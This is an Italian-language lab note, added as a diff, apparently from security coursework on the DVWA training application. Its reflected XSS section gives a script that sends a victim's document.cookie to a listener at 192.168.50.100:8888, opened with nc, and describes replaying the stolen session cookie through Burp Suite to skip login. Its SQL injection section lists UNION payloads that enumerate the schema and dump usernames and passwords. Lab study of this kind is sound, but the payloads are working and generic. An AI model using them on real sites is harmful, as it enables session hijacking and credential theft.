@@ -1,0 +1,21 @@
+xss reflected
+1) mettere in comunicazione le 2 macchine
+2) DVWA->xss reflected
+3) creazione script :<script>var i=new Image();i.src= "http://192.168.50.100:8888?d="+document.cookie</script>
+4) mettere in ascolto nc -lvp 8888
+5) recuperare i cookie di sessione da terminale
+6) usare un altro browser tramite burpsuit con la dvwa
+7) intercettare con burpsuit e mettere al posto del cookie il cookie di sessione che abbiamo recuperato da terminale
+8) in questo modo potremo accedere senza fare il login,grazie al cookie di sessione che abbiamo recuperato.
+
+Sql injection 
+ DVWA-> SQL injection
+ ' OR 'a' = 'a
+' UNION SELECT null,null #
+' UNION SELECT CURRENT_USER() ,null#
+' UNION SELECT USER() ,DATABASE()#(user e nome database)
+' UNION SELECT table_schema,table_name FROM information_schema.tables# (tutte le tabelle e tutti i database)
+' UNION SELECT table_name,column_name FROM information_schema.columns WHERE table_schema ="dvwa"#
+' UNION SELECT user,password FROM dvwa.users # (nomi utenti e password)
+
+
